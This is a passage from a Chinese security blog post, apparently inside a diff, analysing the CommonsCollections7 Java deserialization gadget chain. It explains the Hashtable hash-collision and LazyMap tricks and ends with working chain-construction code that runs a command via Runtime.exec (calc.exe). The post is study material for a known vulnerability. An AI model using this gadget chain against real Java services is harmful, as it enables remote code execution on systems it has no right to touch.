class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">      <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">      <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">      <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">      <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">          <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Creates the new entry.</span></span><br><span class="line">      <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">          Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">      tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">      count++;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后看看这两个equals<br>21行的m.get(key)可以跟LazyMap串起来（因为LazyMap implements Map）<br>构造的时候需要注意几个if的条件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AbstractMapDecorator.equals()</span></span><br><span class="line">	<span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (object == <span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.equals(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// java.util.AbstractMap.equals()</span></span><br><span class="line">	<span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">        <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">            <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">                Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">                <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="利用链构造-6"><a href="#利用链构造-6" class="headerlink" title="利用链构造"></a><strong>利用链构造</strong></h5><p>参考<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240040#h2-0%EF%BC%8C%E8%BF%99%E4%B8%AA%E6%9E%84%E9%80%A0%E5%AD%A6%E9%97%AE%E8%BF%98%E6%98%AF%E5%BE%88%E5%A4%9A%E7%9A%84">https://www.anquanke.com/post/id/240040#h2-0，这个构造学问还是很多的</a></p>
+<p><strong>1. 为什么innerMap为HashMap</strong></p>
+<p>向LazyMap传入Hashmap后在lazymap比较时会调用第一个map的equal方法，同时hashmap继承了AbstractMap类但没有重写equals方法，所以最终调用的是 AbstractMap类中的equals方法，这也是为什么传入hashmap的原因。<br>（后续跟一下执行也能验证这一点）</p>
+<p><strong>2. 为什么创建两个不同的hashmap作为参数</strong></p>
+<p>如果两个hashmap相同的话会直接在hashtable.put的时候认为是一个元素（即进入for循环里的if内部），所以之后就不会在反序列化的时候触发equals代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="comment">// Make sure the value is not null</span></span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    Entry&lt;?,?&gt; tab[] = table;</span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    <span class="keyword">for</span>(; entry != <span class="literal">null</span> ; entry = entry.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123;</span><br><span class="line">            <span class="type">V</span> <span class="variable">old</span> <span class="operator">=</span> entry.value;</span><br><span class="line">            entry.value = value;</span><br><span class="line">            <span class="keyword">return</span> old;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addEntry(hash, key, value, index);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 为什么选择 “zZ” 和 “yy” 作为key</strong></p>
+<p>回收e.hash &#x3D;&#x3D; hash的伏笔，这里存在哈希碰撞<br>不能直接用两个相同key的原因在于LazyMap.get想触发transform必须要map.containsKey(key) &#x3D;&#x3D; false，相同key就送走了<br>（这一步感觉真的很巧妙）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HASH collidsion</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;yy&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="string">&quot;zZ&quot;</span>;</span><br><span class="line">System.out.println(s1.hashCode()==s2.hashCode());</span><br><span class="line"></span><br><span class="line"><span class="comment">// LazyMap.get()</span></span><br><span class="line">	<span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>4. 为什么要移除第二个LazyMap中的元素</strong></p>
+<p>（这个说实话也很巧妙）<br>通过debug可以发现，hashtable.put(lazyMap2, 2);之后，两个LazyMap长度不一样了：</p>
+<img src="C:\Users\13685\AppData\Roaming\Typora\typora-user-images\image-20221223190536044.png" alt="image-20221223190536044" style="zoom:67%;" />
+
+<p>原因在于会走到LazyMap.get()里，触发transformer然后往lazyMap2里push一个东西<br>调用栈可以看左下角<br>（同时可以发现，如果已经把构造的chainedTransformer放进来，这里就会触发命令执行）</p>
+<img src="C:\Users\13685\AppData\Roaming\Typora\typora-user-images\image-20221223211939441.png" alt="image-20221223211939441" style="zoom:67%;" />
+
+<p>伏笔回收*2，java.util.AbstractMap.equals()中比较size的地方，必须两个相等才能有后续比较</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (m.size() != size())</span><br><span class="line">   	<span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>
+
+<p>所以需要一步remove，保证在反序列化的时候两个LazyMap的size相同。</p>
+<p>最后，transformer链利用反射进行赋值，防止构造过程中直接触发payload执行命令。<br>得到如下调用链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chainedTransformer);</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chainedTransformer);</span><br><span class="line">lazyMap1.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">lazyMap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line">lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line">setFieldValue(chainedTransformer, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br></pre></td></tr></table></figure>
+
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Java-Web/" rel="tag"># Java Web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/11/16/2020-ShangHaiCTF/" rel="next" title="2020上海大学生网络安全赛 Writeup (Web)">
+                <i class="fa fa-chevron-left"></i> 2020上海大学生网络安全赛 Writeup (Web)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2022/12/10/log4j/" rel="prev" title="CVE-2021-44228 (Log4j2 RCE) 漏洞学习">
+                CVE-2021-44228 (Log4j2 RCE) 漏洞学习 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#CommonsCollections1"><span class="nav-number">1.</span> <span class="nav-text">CommonsCollections1</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86"><span class="nav-number">1.1.</span> <span class="nav-text">知识点整理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%82%B9%EF%BC%9ATransformer"><span class="nav-number">1.2.</span> <span class="nav-text">命令执行点：Transformer</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0"><span class="nav-number">1.3.</span> <span class="nav-text">利用链构造</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CommonsCollections2"><span class="nav-number">2.</span> <span class="nav-text">CommonsCollections2</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86-1"><span class="nav-number">2.1.</span> <span class="nav-text">知识点整理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%82%B9%EF%BC%9AJAVAssist%E6%8F%92%E5%85%A5%E6%81%B6%E6%84%8F%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-number">2.2.</span> <span class="nav-text">命令执行点：JAVAssist插入恶意字节码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0-1"><span class="nav-number">2.3.</span> <span class="nav-text">利用链构造</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E9%97%AE%E9%A2%98"><span class="nav-number">2.4.</span> <span class="nav-text">其他问题</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CommonsCollections3"><span class="nav-number">3.</span> <span class="nav-text">CommonsCollections3</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0-2"><span class="nav-number">3.1.</span> <span class="nav-text">利用链构造</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CommonsCollections4"><span class="nav-number">4.</span> <span class="nav-text">CommonsCollections4</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="nav-number">4.1.</span> <span class="nav-text">利用链分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0-3"><span class="nav-number">4.2.</span> <span class="nav-text">利用链构造</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CommonsCollections5"><span class="nav-number">5.</span> <span class="nav-text">CommonsCollections5</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-1"><span class="nav-number">5.1.</span> <span class="nav-text">利用链分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0-4"><span class="nav-number">5.2.</span> <span class="nav-text">利用链构造</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CommonsCollections6"><span class="nav-number">6.</span> <span class="nav-text">CommonsCollections6</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86-2"><span class="nav-number">6.1.</span> <span class="nav-text">知识点整理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0-5"><span class="nav-number">6.2.</span> <span class="nav-text">利用链构造</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CommonsCollections7"><span class="nav-number">7.</span> <span class="nav-text">CommonsCollections7</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-2"><span class="nav-number">7.1.</span> <span class="nav-text">利用链分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0-6"><span class="nav-number">7.2.</span> <span class="nav-text">利用链构造</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number"></span> <span class="nav-text"></span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">me0wxy</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
